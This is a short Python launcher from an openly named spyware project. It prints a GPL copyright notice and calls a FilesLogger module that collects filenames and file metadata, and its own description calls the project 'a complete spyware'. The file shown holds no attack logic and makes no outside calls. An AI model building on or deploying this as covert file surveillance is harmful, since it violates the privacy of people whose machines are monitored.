#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file gets all filenames and metadata.
#    Copyright (C) 2021, 2022, 2024  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file gets all filenames and metadata.

~# python3 FilesLogger.py filesSpy.conf

>>> from os import environ
>>> environ['filesSpy.conf'] = 'filesSpy.conf'
>>> from SpyWare.FilesLogger import filesSpy
>>> filesSpy()                  # (using env) OR
>>> filesSpy('filesSpy.conf') # (using config file name) OR
>>> filesSpy(argv=["FilesLogger.py", "filesSpy.conf"]) # (using argv)
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

try:
    from .FilesLogger import main as filesSpy
except ImportError:
    from FilesLogger import main as filesSpy

print(copyright)
filesSpy()
